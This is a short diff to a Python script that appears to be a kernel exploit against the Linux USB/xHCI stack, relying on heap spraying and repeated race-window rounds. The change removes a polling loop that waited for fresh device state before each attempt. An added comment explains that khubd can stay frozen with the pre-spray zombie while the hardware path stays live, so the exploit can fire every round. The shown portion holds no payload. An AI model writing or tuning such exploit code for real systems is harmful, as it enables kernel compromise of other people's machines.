@@ -161,19 +161,12 @@ def main():
 
     for r in range(80):
         print('== window round %d (pad 0x%03x) ==' % (r, pads[pad_idx % len(pads)]))
-        f_pre = state(fd)
+        # No freshness gate: khubd can be frozen with the pre-spray
+        # zombie (csc never consumed) while the module->xHC->chip wire
+        # path stays fully live. The probe CYCs' halt-recovery walks the
+        # dequeue pointer past any stuck kernel head TD themselves.
+        f = state(fd)
         pr_raw()
-        t0 = time.time()
-        fresh = False
-        f = f_pre
-        while time.time() - t0 < 20.0:
-            f = state(fd)
-            if f[5] and (f[6] != f_pre[6] or f[7] != f_pre[7] or f[4] != f_pre[4]):
-                fresh = True
-                break
-            time.sleep(0.005)
-        if not fresh:
-            continue
 
         t0 = time.time()
         shots = 0
